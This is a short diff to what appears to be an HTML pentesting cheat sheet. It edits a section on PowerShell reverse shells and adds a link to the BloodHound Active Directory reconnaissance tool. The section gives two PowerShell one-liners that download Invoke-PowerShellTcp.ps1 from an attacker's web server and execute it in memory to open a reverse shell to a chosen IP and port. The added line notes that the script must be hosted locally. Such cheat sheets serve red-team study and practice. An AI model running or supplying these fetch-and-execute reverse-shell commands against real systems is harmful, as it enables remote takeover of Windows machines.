@@ -497,11 +497,18 @@ PS> Enter-PSSession -ComputerName <dnshostname>
 
 <b>::: create encoded reverse shell using "Invoke-PowerShellTcp.ps1"</b>
 
+note: file "Invoke-PowerShellTcp.ps1" need to be available on a local web server.
+
 PS> powershell.exe iex (iwr http://<ip_Addr>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <ip_Addr> -Port <port>
 
 or
 
 PS> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<ip_addr>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <ip_Addr> -Port 443
+
+<b>-BLOODHOUND-</b>
+
+<a href="https://github.com/BloodHoundAD/BloodHound">bloodhound tool</a> 
+
 
 </center>
 </body>
